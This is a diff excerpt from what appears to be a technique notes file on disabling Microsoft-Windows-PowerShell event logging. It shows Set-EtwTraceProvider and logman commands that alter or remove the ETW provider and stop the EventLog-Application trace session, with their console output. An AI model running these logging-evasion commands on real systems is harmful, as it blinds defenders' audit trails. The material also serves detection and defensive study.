@@ -374,23 +374,27 @@ Microsoft-Windows-Deplorch               {B9DA9FE6-AE5F-4F3E-B2FA-8E623C11DC75}
 <SNIP>
 
 
-=> The following PowerShell code immediately disables Microsoft-Windows-PowerShell event logging until
+=> Provider “Enable” property modification = The following PowerShell code disables Microsoft-Windows-PowerShell event logging. 
+   Upon rebooting, events will cease to be reported to the PowerShell event log.
+
+PS C:\Users\Administrator> Set-EtwTraceProvider -Guid '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}' -AutologgerName 'EventLog-Application' -Property 0x11
+
+
+=> ETW provider removal from a trace session = The following PowerShell code immediately disables Microsoft-Windows-PowerShell event logging until
    a reboot occurs or the attacker restores the ETW provider:
 
 C:\Users\Administrator>logman update trace EventLog-Application --p Microsoft-Windows-PowerShell -ets
 The command completed successfully.
 
-C:\Users\Administrator.PO718687>logman stop EventLog-Application -ets
+C:\Users\Administrator>logman stop EventLog-Application -ets
 The command completed successfully.
 
-
-C:\Users\Administrator.PO718687>logman query "EventLog-Application" -ets
+C:\Users\Administrator>logman query "EventLog-Application" -ets
 Error:
 Data Collector Set was not found.
 
-C:\Users\Administrator.PO718687>logman start EventLog-Application -ets
+C:\Users\Administrator>logman start EventLog-Application -ets
 The command completed successfully.
-
 
 
 ====================================================================================================================================
